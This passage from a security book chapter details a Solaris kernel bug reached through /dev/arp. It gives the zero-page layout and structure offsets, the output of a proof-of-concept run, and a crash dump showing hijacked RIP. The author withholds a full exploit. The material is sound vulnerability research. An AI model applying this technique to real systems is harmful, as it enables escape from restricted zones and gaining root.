+<p>177</p></td><td style="text-align: left" valign="top"><p><code class="literal">sq = qp-&gt;q_syncq;</code></p></td><td style="text-align: left" valign="top"><p>The offset of <code class="literal">q_syncq</code> inside the <code class="literal">qp</code> structure is <code class="literal">0x78</code>. Since <code class="literal">q_syncq</code> is referenced later, it has to point to a valid memory address. I chose <code class="literal">0x7d0</code>, which is an address in the mapped zero page.</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>180</p></td><td style="text-align: left" valign="top"><p><code class="literal">qi = qp-&gt;q_qinfo;</code></p></td><td style="text-align: left" valign="top"><p>The value of <code class="literal">qp-&gt;q_qinfo</code> is assigned to <code class="literal">qi</code>. The offset of <code class="literal">q_qinfo</code> inside the <code class="literal">qp</code> structure is <code class="literal">0x0</code>. Since the <code class="literal">qp</code> structure starts at address <code class="literal">0x28</code>, the value <code class="literal">0x0</code> is assigned to <code class="literal">qi</code> (see (4) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>273</p></td><td style="text-align: left" valign="top"><p><code class="literal">putproc = qi-&gt; qi_putp;</code></p></td><td style="text-align: left" valign="top"><p>The value of <code class="literal">qi-&gt;qi_putp</code> is assigned to the function pointer <code class="literal">putproc</code>. The offset of <code class="literal">qi_putp</code> inside the <code class="literal">qi</code> structure is <code class="literal">0x0</code>. Therefore, <code class="literal">qi-&gt;qi_putp</code> is referenced at address <code class="literal">0x0</code>, <code class="literal">and</code> the value at this address (<code class="literal">0x0000000041414141</code>) is assigned to the function pointer.</p></td></tr></tbody></table></div></div><p>I then compiled and tested the POC code as an unprivileged user inside a restricted, non-global Solaris Zone:</p><a id="I_programlisting3_d1e3212"/><pre class="programlisting">solaris$ <strong class="userinput"><code>isainfo -b</code></strong>
+64
+
+solaris$ <strong class="userinput"><code>id</code></strong>
+uid=100(wwwuser) gid=1(other)
+
+solaris$ <strong class="userinput"><code>zonename</code></strong>
+wwwzone
+
+solaris$ <strong class="userinput"><code>ppriv -S $$</code></strong>
+1422:   -bash
+flags = &lt;none&gt;
+        E: basic
+        I: basic
+        P: basic
+        L: zone
+
+solaris$ <strong class="userinput"><code>/usr/sfw/bin/gcc -m64 -o poc2 poc2.c</code></strong>
+
+solaris$ <strong class="userinput"><code>./poc2</code></strong>
+[+] Opening '/dev/arp' device .. OK
+[+] Trying to map zero page .. OK
+[+] PAGESIZE: 4096
+[+] Zero page data:
+... 0x00: 0x0000000041414141
+... 0x08: 0x0000000000000010
+... 0x10: 0x0000000000000000
+... 0x18: 0x0000000000000000
+... 0x20: 0x0000000000000028
+... 0x28: 0x0000000000000000
+... 0x30: 0x0000000000000000
+... 0x38: 0x0000000000000000
+... 0x40: 0x0000000000000028
+... 0xa0: 0x00000000000007d0
+[+] The bug will be triggered in 2 seconds..</pre><p>The system crashed immediately and rebooted. After the reboot, I inspected the kernel crash files (see Section B.1 for a description of the following debugger commands):</p><a id="I_programlisting3_d1e3236"/><pre class="programlisting">solaris# <strong class="userinput"><code>id</code></strong>
+uid=0(root) gid=0(root)
+
+solaris# <strong class="userinput"><code>hostname</code></strong>
+bob
+
+solaris# <strong class="userinput"><code>cd /var/crash/bob/</code></strong>
+
+solaris# <strong class="userinput"><code>ls</code></strong>
+bounds    unix.0    vmcore.0    unix.1    vmcore.1
+
+solaris# <strong class="userinput"><code>mdb unix.1 vmcore.1</code></strong>
+Loading modules: [ unix krtld genunix specfs dtrace cpu.generic uppc
+ pcplusmp ufs ip hook neti sctp arp usba fcp fctl nca lofs mpt zfs
+ audiosup md cpc random crypto fcip logindmux ptm sppp nfs ]
+
+&gt; <strong class="userinput"><code>::msgbuf</code></strong>
+[..]
+panic[cpu0]/thread=ffffffff8816c120:
+BAD TRAP: type=e (#pf Page fault) rp=fffffe800029f530
+ <strong class="userinput"><code>addr=41414141</code></strong> occurred in module
+ "&lt;unknown&gt;" due to an illegal access to a user address
+
+
+poc2:
+#pf Page fault
+<strong class="userinput"><code>Bad kernel fault at addr=0x41414141</code></strong>
+pid=1404, <strong class="userinput"><code>pc=0x41414141</code></strong>, sp=0xfffffe800029f628, eflags=0x10246
+cr0: 80050033&lt;pg,wp,ne,et,mp,pe&gt; cr4: 6b0&lt;xmme,fxsr,pge,pae,pse&gt;
+cr2: 41414141 cr3: 1782a000 cr8: c
+        rdi:               28 rsi: ffffffff81700380 rdx: ffffffff8816c120
+        rcx:                0  r8:                0  r9:                0
+        rax:                0 rbx:                0 rbp: fffffe800029f680
+        r10:                1 r11:                0 r12:              7d0
+        r13:               28 r14: ffffffff81700380 r15:                0
+        fsb: fffffd7fff220200 gsb: fffffffffbc27fc0  ds:                0
+         es:                0  fs:              1bb  gs:                0
+        trp:                e err:               10 <strong class="userinput"><code>rip:         41414141</code></strong>
+         cs:               28 rfl:            10246 rsp: fffffe800029f628
+         ss:               30
+
+fffffe800029f440 unix:die+da ()
+fffffe800029f520 unix:trap+5e6 ()
+fffffe800029f530 unix:_cmntrap+140 ()
+<strong class="userinput"><code>fffffe800029f680 41414141 ()</code></strong>
+fffffe800029f6d0 ip:ip_sioctl_tunparam+ee ()
+fffffe800029f780 ip:ip_process_ioctl+280 ()
+fffffe800029f820 ip:ip_wput_nondata+970 ()
+fffffe800029f910 ip:ip_output_options+537 ()
+fffffe800029f920 ip:ip_output+10 ()
+fffffe800029f940 ip:ip_wput+37 ()
+fffffe800029f9a0 unix:putnext+1f1 ()
+fffffe800029f9d0 arp:ar_wput+9d ()
+fffffe800029fa30 unix:putnext+1f1 ()
+fffffe800029fab0 genunix:strdoioctl+67b ()
+fffffe800029fdd0 genunix:strioctl+620 ()
+fffffe800029fdf0 specfs:spec_ioctl+67 ()
+fffffe800029fe20 genunix:fop_ioctl+25 ()
+fffffe800029ff00 genunix:ioctl+ac ()
+fffffe800029ff10 unix:brand_sys_syscall+21d ()
+
+syncing file systems...
+ done
+dumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel
+
+<strong class="userinput"><code>&gt; $c</code></strong>
+<strong class="userinput"><code>0x41414141()</code></strong>
+ip_sioctl_tunparam+0xee()
+ip_process_ioctl+0x280()
+ip_wput_nondata+0x970()
+ip_output_options+0x537()
+ip_output+0x10()
+ip_wput+0x37()
+putnext+0x1f1()
+ar_wput+0x9d()
+putnext+0x1f1()
+strdoioctl+0x67b()
+strioctl+0x620()
+spec_ioctl+0x67()
+fop_ioctl+0x25()
+ioctl+0xac()
+sys_syscall+0x17b()</pre><p>This time, the system crashed as the kernel tried to execute code at address <code class="literal">0x41414141</code> (the value of the <code class="literal">RIP</code> register, as shown in bold in the debugger output above). That means I had managed to gain full control over <code class="literal">EIP</code>/<code class="literal">RIP</code>.<a id="IDX-CHP-3-0019" class="indexterm"/></p><p>With the right exploit payload, this bug can be used to escape from a restricted, non-global Solaris Zone and then gain superuser privileges in the global zone.</p><p>Because of the strict laws in my home country, I am not allowed to provide you with a full working exploit. However, if you are interested, you can go to the book’s website to watch a video I recorded that shows the exploit in action.<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-12" class="footnoteref">34</a>]</sup></p></div></div></body></html>
